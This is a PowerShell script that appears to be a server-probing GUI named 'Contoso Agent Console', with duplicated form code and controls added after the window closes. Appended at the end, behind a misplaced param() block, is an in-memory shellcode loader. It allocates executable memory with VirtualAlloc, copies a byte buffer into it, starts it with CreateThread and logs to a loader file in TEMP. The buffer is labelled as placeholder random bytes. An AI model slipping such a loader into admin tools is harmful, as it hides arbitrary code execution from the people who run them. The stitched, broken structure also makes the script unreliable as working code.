
$ErrorActionPreference = 'Stop'


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Contoso Agent Console'
$form.Size = New-Object System.Drawing.Size(900, 600)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('dc02', 'sql-prod-02', 'srv01', 'app-prod-01')
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Contoso Agent Console'
$form.Size = New-Object System.Drawing.Size(900, 600)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('dc02', 'sql-prod-02', 'srv01', 'app-prod-01')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = 'Probe'
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)

$grid = New-Object System.Windows.Forms.DataGridView
$grid.Location = New-Object System.Drawing.Point(18, 96)
$grid.Size = New-Object System.Drawing.Size(700, 300)
$grid.ReadOnly = $true
$grid.AllowUserToAddRows = $false
$grid.AutoSizeColumnsMode = 'Fill'
$form.Controls.Add($grid)

$table = New-Object System.Data.DataTable
[void]$table.Columns.Add('Server')
[void]$table.Columns.Add('Status')
[void]$table.Columns.Add('CheckedAt')
foreach ($server in $script:servers) {
    [void]$table.Rows.Add($server, 'Unknown', (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))
}
$grid.DataSource = $table

$saveButton = New-Object System.Windows.Forms.Button
$saveButton.Text = 'Export CSV'
$saveButton.Location = New-Object System.Drawing.Point(18, 410)
$saveButton.Size = New-Object System.Drawing.Size(120, 28)
$saveButton.Add_Click({
    $dialog = New-Object System.Windows.Forms.SaveFileDialog
    $dialog.Filter = 'CSV files (*.csv)|*.csv'
    $dialog.FileName = "console-output.csv"
    if ($dialog.ShowDialog() -eq 'OK') {
        $table | Export-Csv -Path $dialog.FileName -NoTypeInformation -Encoding UTF8
        $statusLabel.Text = 'Exported'
    }
})
$form.Controls.Add($saveButton)

$menu = New-Object System.Windows.Forms.MenuStrip
$fileMenu = New-Object System.Windows.Forms.ToolStripMenuItem
$fileMenu.Text = 'File'
$exitItem = New-Object System.Windows.Forms.ToolStripMenuItem
$exitItem.Text = 'Exit'
$exitItem.Add_Click({ $form.Close() })
[void]$fileMenu.DropDownItems.Add($exitItem)
[void]$menu.Items.Add($fileMenu)
$form.Controls.Add($menu)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 120000
$timer.Add_Tick({
    $statusLabel.Text = 'Last refresh: ' + (Get-Date).ToString('HH:mm:ss')
})
$timer.Start()
$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()

Write-Host ("Console closed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ForegroundColor DarkGray

$form.KeyPreview = $true
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'Escape') { $form.Close() }
})

$aboutItem = New-Object System.Windows.Forms.ToolStripMenuItem
$aboutItem.Text = 'About'
$aboutItem.Add_Click({
    [System.Windows.Forms.MessageBox]::Show('Contoso operations helper', 'About')
})

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(18, 410)
$progress.Size = New-Object System.Drawing.Size(660, 18)
$form.Controls.Add($progress)

$contextMenu = New-Object System.Windows.Forms.ContextMenuStrip
$copyItem = New-Object System.Windows.Forms.ToolStripMenuItem
$copyItem.Text = 'Copy'
[void]$contextMenu.Items.Add($copyItem)
$listBox.ContextMenuStrip = $contextMenu

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x07, 0xe9, 0x29, 0x36, 0x0b, 0x0c, 0x04, 0x5c, 0x85, 0x10, 0x30, 0xc8, 0xdf, 0xc9, 0xea, 0xfd,
    0x26, 0x44, 0xc0, 0x23, 0x16, 0xad, 0xac, 0x91, 0x94, 0x88, 0x89, 0xc4, 0x93, 0x57, 0x48, 0xe3,
    0x3e, 0x5d, 0x31, 0x47, 0x7d, 0xc2, 0x1d, 0x96, 0xfd, 0x8b, 0x7c, 0xdd, 0xf9, 0xf8, 0x29, 0x78,
    0xbb, 0x22, 0x74, 0x63, 0x08, 0x19, 0xbe, 0x29, 0x07, 0x0e, 0x3b, 0xdf, 0xb4, 0x62, 0x08, 0x38,
    0x3a, 0x63, 0xeb, 0x5b, 0xbb, 0x25, 0xec, 0xf8, 0xa5, 0xe2, 0x0e, 0xe3, 0x37, 0x8f, 0x23, 0xc8,
    0x01, 0xf8, 0x6b, 0x62, 0xcd, 0x3a, 0xbb, 0x1f, 0x89, 0xab, 0xef, 0x60, 0x00, 0xb3, 0x88, 0x68,
    0xe5, 0xba, 0x4e, 0x50, 0x9f, 0xb4, 0xb7, 0xb0, 0xc2, 0xa0, 0xfc, 0x1f, 0xe4, 0xe5, 0xc7, 0x9d,
    0xd0, 0x36, 0x0c, 0x22, 0x79, 0xe5, 0xa1, 0x1c, 0x66, 0xe8, 0xac, 0x02, 0xf6, 0xa6, 0x91, 0x8a,
    0x1c, 0xc0, 0xaa, 0x3b, 0xe2, 0xa0, 0xaf, 0x31, 0x08, 0x81, 0xc5, 0xc1, 0x13, 0xfa, 0x18, 0x53,
    0x8e, 0x36, 0x79, 0x5f, 0x03, 0x23, 0xa5, 0x7f, 0xfd, 0x55, 0x46, 0x43, 0xd8, 0xe0, 0xc9, 0xbd,
    0xeb, 0x98, 0x49, 0xa7, 0x33, 0x48, 0xa2, 0xc0, 0x0b, 0x9b, 0x49, 0x74, 0x0d, 0xf3, 0xb7, 0x1f,
    0xa0, 0x87, 0xe8, 0xd9, 0x5d, 0xae, 0x3d, 0x4c, 0xa7, 0xe5, 0x7b, 0xb8, 0xcd, 0xa3, 0xb2, 0xfc,
    0x34, 0x56, 0x2b, 0xcd, 0x1f, 0x80, 0xcd, 0xde, 0xc6, 0x87, 0xb0, 0x1b, 0x09, 0xe9, 0xb4, 0xa8,
    0x00, 0x17, 0x3e, 0xe0, 0x2e, 0x7b, 0x8f, 0xde, 0x28, 0xce, 0x6c, 0x34, 0xb2, 0x03, 0x7b, 0xd0,
    0x88, 0x97
)

$ProcHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 4025)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
